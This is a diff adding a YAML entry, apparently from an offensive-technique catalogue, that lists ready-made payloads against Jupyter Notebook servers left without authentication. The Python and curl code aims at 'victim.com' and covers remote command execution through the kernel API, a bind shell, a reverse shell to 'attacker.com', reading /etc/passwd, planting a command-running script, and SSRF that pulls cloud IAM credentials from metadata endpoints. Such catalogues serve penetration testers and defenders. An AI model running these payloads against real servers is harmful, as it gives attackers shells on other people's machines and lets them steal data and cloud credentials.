@@ -1,0 +1,199 @@
+---
+comment: "Jupyter Notebook is a Python-based interactive computing environment commonly\
+  \ deployed\nin data science, ML, and research stacks. When launched without authentication\n\
+  (--NotebookApp.token='' --NotebookApp.password=''), the full REST API is accessible\n\
+  to anyone with network access \u2014 including kernel execution and terminal sessions.\n\
+  \nTwo exploitation surfaces exist regardless of whether a token is set:\n1. Kernel\
+  \ API (/api/kernels) \u2014 creates a Python kernel and executes arbitrary code\
+  \ via\n   WebSocket. The executing user is whoever started the Jupyter process (frequently\
+  \ root\n   in Docker/Kubernetes deployments).\n2. Terminal API (/api/terminals)\
+  \ \u2014 spawns a full interactive shell session over WebSocket\n   when the terminal\
+  \ feature is enabled (default). Requires websocat or wscat on the\n   attacker machine\
+  \ to communicate.\n\nPayloads below use the kernel API with the websocket-client\
+  \ Python package, which works\nagainst both classic Notebook and JupyterLab. Install\
+  \ with: pip install requests websocket-client\n"
+functions:
+  bind-shell:
+  - code: |
+      import requests, json, uuid, websocket
+
+      BASE = "http://victim.com"
+      kid = requests.post(f"{BASE}/api/kernels",
+          headers={"Content-Type": "application/json"}).json()["id"]
+
+      ws = websocket.create_connection(f"ws://victim.com/api/kernels/{kid}/channels")
+      ws.send(json.dumps({
+          "header": {"msg_id": uuid.uuid4().hex, "username": "", "session": "",
+                     "msg_type": "execute_request", "version": "5.0"},
+          "parent_header": {}, "metadata": {}, "buffers": [], "channel": "shell",
+          "content": {
+              "code": ("import socket,subprocess\n"
+                       "s=socket.socket()\n"
+                       "s.bind(('0.0.0.0',12345))\n"
+                       "s.listen(1)\n"
+                       "c,_=s.accept()\n"
+                       "subprocess.call(['/bin/sh'],stdin=c,stdout=c,stderr=c)"),
+              "silent": True
+          }
+      }))
+      ws.close()
+    comment: "Binds a shell to TCP port 12345 on the Jupyter server. The WebSocket\
+      \ is closed\nafter sending \u2014 the kernel blocks waiting for a connection.\
+      \ Inbound firewall rules\non the target host may block the port.\n"
+    connector: tcp-client
+    contexts:
+      unauthenticated:
+    tty: false
+  file-read:
+  - code: |
+      import requests, json, uuid, websocket
+
+      BASE = "http://victim.com"
+      kid = requests.post(f"{BASE}/api/kernels",
+          headers={"Content-Type": "application/json"}).json()["id"]
+
+      ws = websocket.create_connection(f"ws://victim.com/api/kernels/{kid}/channels")
+      ws.send(json.dumps({
+          "header": {"msg_id": uuid.uuid4().hex, "username": "", "session": "",
+                     "msg_type": "execute_request", "version": "5.0"},
+          "parent_header": {}, "metadata": {}, "buffers": [], "channel": "shell",
+          "content": {"code": "print(open('/etc/passwd').read())", "silent": False}
+      }))
+      while True:
+          m = json.loads(ws.recv())
+          if m.get("msg_type") == "stream":
+              print(m["content"]["text"]); break
+          if m.get("msg_type") in ("execute_reply", "error"):
+              break
+      ws.close()
+    comment: |
+      Reads an arbitrary file via Python's open() executed inside the kernel. The file
+      content is returned in the stream iopub message. The kernel process must have read
+      permission on the target path.
+    contexts:
+      unauthenticated:
+  file-write:
+  - code: |
+      # Write a file via the Jupyter Contents API (path relative to --notebook-dir)
+      curl -X PUT "http://victim.com/api/contents/shell.py" \
+        -H "Content-Type: application/json" \
+        -d '{"type":"file","format":"text","content":"import subprocess,sys\nsys.stdout.write(subprocess.check_output(sys.argv[1],shell=True).decode())\n"}'
+    comment: "The Contents API allows writing arbitrary files under the Jupyter notebook\
+      \ directory\n(--notebook-dir, default ~/). The written Python script can then\
+      \ be executed via\nthe kernel API or the terminal. Adjust the path to land in\
+      \ a useful location.\nTo overwrite an existing file, a prior GET to /api/contents/<path>\
+      \ is not needed \u2014\nPUT creates or replaces without precondition.\n"
+    contexts:
+      unauthenticated:
+  rce:
+  - code: |
+      import requests, json, uuid, websocket
+
+      BASE = "http://victim.com"
+
+      # Start a Python kernel
+      kid = requests.post(f"{BASE}/api/kernels",
+          headers={"Content-Type": "application/json"}).json()["id"]
+
+      # Connect to the kernel channel
+      ws = websocket.create_connection(f"ws://victim.com/api/kernels/{kid}/channels")
+
+      # Send execute_request with an OS command
+      ws.send(json.dumps({
+          "header": {"msg_id": uuid.uuid4().hex, "username": "", "session": "",
+                     "msg_type": "execute_request", "version": "5.0"},
+          "parent_header": {}, "metadata": {}, "buffers": [], "channel": "shell",
+          "content": {
+              "code": "import subprocess; print(subprocess.check_output('id', shell=True).decode())",
+              "silent": False
+          }
+      }))
+
+      # Read output from iopub messages
+      while True:
+          m = json.loads(ws.recv())
+          if m.get("msg_type") == "stream":
+              print(m["content"]["text"]); break
+          if m.get("msg_type") in ("execute_reply", "error"):
+              break
+      ws.close()
+    comment: |
+      Creates a Python kernel via the /api/kernels endpoint and executes an OS command
+      by sending an execute_request message over WebSocket. Command output is returned
+      in a stream iopub message. The kernel runs as the Jupyter process user.
+
+      When a token is required, add headers={"Authorization": f"token {TOKEN}"} to
+      the requests.post() call and the websocket URL:
+        ws://victim.com/api/kernels/{kid}/channels?token={TOKEN}
+    contexts:
+      unauthenticated:
+  reverse-shell:
+  - blind: true
+    code: |
+      import requests, json, uuid, websocket
+
+      BASE = "http://victim.com"
+      kid = requests.post(f"{BASE}/api/kernels",
+          headers={"Content-Type": "application/json"}).json()["id"]
+
+      ws = websocket.create_connection(f"ws://victim.com/api/kernels/{kid}/channels")
+      ws.send(json.dumps({
+          "header": {"msg_id": uuid.uuid4().hex, "username": "", "session": "",
+                     "msg_type": "execute_request", "version": "5.0"},
+          "parent_header": {}, "metadata": {}, "buffers": [], "channel": "shell",
+          "content": {
+              "code": ("import socket,os,subprocess\n"
+                       "s=socket.socket()\n"
+                       "s.connect(('attacker.com',12345))\n"
+                       "os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)\n"
+                       "subprocess.call(['/bin/sh','-i'])"),
+              "silent": True
+          }
+      }))
+      ws.close()
+    comment: "Executes a Python socket reverse shell inside the Jupyter kernel. The\
+      \ WebSocket\nis closed immediately after sending \u2014 the kernel keeps the\
+      \ shell alive independently.\nThe shell runs as the Jupyter process user (often\
+      \ root in container deployments).\n"
+    contexts:
+      unauthenticated:
+    listener: tcp-server
+    tty: false
+  ssrf:
+  - code: |
+      import requests, json, uuid, websocket
+
+      BASE = "http://victim.com"
+      kid = requests.post(f"{BASE}/api/kernels",
+          headers={"Content-Type": "application/json"}).json()["id"]
+
+      ws = websocket.create_connection(f"ws://victim.com/api/kernels/{kid}/channels")
+      ws.send(json.dumps({
+          "header": {"msg_id": uuid.uuid4().hex, "username": "", "session": "",
+                     "msg_type": "execute_request", "version": "5.0"},
+          "parent_header": {}, "metadata": {}, "buffers": [], "channel": "shell",
+          "content": {
+              "code": ("import urllib.request\n"
+                       "r = urllib.request.urlopen('http://169.254.169.254/latest/meta-data/iam/security-credentials/')\n"
+                       "print(r.read().decode())"),
+              "silent": False
+          }
+      }))
+      while True:
+          m = json.loads(ws.recv())
+          if m.get("msg_type") == "stream":
+              print(m["content"]["text"]); break
+          if m.get("msg_type") in ("execute_reply", "error"):
+              break
+      ws.close()
+    comment: "The Jupyter kernel executes arbitrary Python, including outbound HTTP\
+      \ requests via\nurllib or requests. This makes the kernel API a full SSRF primitive\
+      \ \u2014 the request\noriginates from the Jupyter server host, which typically\
+      \ has access to:\n- AWS: http://169.254.169.254/latest/meta-data/iam/security-credentials/\n\
+      - GCP: http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token\n\
+      - Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01\n\n\
+      Response content is returned in the stream iopub message. No additional credentials\n\
+      are needed when Jupyter runs without token authentication (--NotebookApp.token='').\n"
+    contexts:
+      unauthenticated:
+...
